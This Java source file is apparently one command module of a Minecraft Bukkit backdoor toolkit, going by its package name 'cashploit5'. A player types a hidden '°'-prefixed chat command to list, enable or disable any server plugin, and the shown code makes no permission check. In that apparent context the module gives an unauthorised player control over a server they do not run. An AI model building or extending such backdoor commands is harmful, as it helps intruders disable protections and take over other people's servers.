package de.cashploit5.v1_12_2.command;

import java.util.ArrayList;
import java.util.List;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;

import de.cashploit5.Main;

public class PluginManagerCommand extends Command {

	public PluginManagerCommand() {
		super("pluginmanager");
	}

	@Override
	public void onCommand(Player p, Command command, String[] args) {
		if(args.length == 1) {
			if(args[0].equalsIgnoreCase("list")) {
				List<String> plugins = new ArrayList<>();
				for(Plugin plugin : Bukkit.getPluginManager().getPlugins()) {
					plugins.add(plugin.getName());
				}
				String sending = "";
				for(String plugin : plugins) {
					sending += "§6,§a" + plugin;
				}
				sending = sending.substring(3);
				Main.sendMessage(p, "§aPlugins§f(§6" + Bukkit.getPluginManager().getPlugins().length + "§f)"
						+ " §a" + sending);
			} else {
				Main.sendMessage(p, "§6°pluginmanager <enable,disable,list> [<Plugin>]");
			}
		} else if (args.length == 2) {
			if (args[0].equalsIgnoreCase("enable")) {
				Plugin plugin = Bukkit.getPluginManager().getPlugin(args[1]);
				if (plugin != null) {
					Bukkit.getPluginManager().enablePlugin(plugin);
				} else {
					Main.sendMessage(p, "§cDieses Plugin existiert nicht");
				}
			} else if (args[0].equalsIgnoreCase("disable")) {
				Plugin plugin = Bukkit.getPluginManager().getPlugin(args[1]);
				if (plugin != null) {
					Bukkit.getPluginManager().disablePlugin(plugin);
				} else {
					Main.sendMessage(p, "§cDieses Plugin existiert nicht");
				}
			} else {
				Main.sendMessage(p, "§6°pluginmanager <enable,disable,list> [<Plugin>]");
			}
		} else {
			Main.sendMessage(p, "§6°pluginmanager <enable,disable,list> [<Plugin>]");
		}
	}
}
